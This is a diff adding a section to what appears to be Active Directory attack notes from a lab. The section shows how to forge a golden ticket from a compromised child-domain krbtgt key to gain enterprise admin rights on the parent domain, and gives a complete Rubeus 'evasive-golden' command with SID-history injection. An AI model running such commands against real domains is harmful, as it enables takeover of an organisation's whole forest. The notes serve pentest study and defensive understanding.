@@ -48,3 +48,11 @@ Then, ask another service ticket for service HTTP using the previous ticket:
 We now have a service ticket to the parent DC with HTTP and Administrator privileges, we can for instance use WinRM to access the DC.
 
 It is possible to specify another service name such as CIFS to access the server via SMB.
+
+## Through krbtgt
+
+As we compromised the krbtgt account of the child domain, it is possible to create a golden ticket that will be valid on the parent domain :
+
+```powershell
+> Rubeus.exe evasive-golden /user:Administrator /id:500 /domain:us.techcorp.local /sid:<child domain SID> /groups:513 /sids:<enterprise admin SID> /aes256:<krbtgt key> /ptt
+```
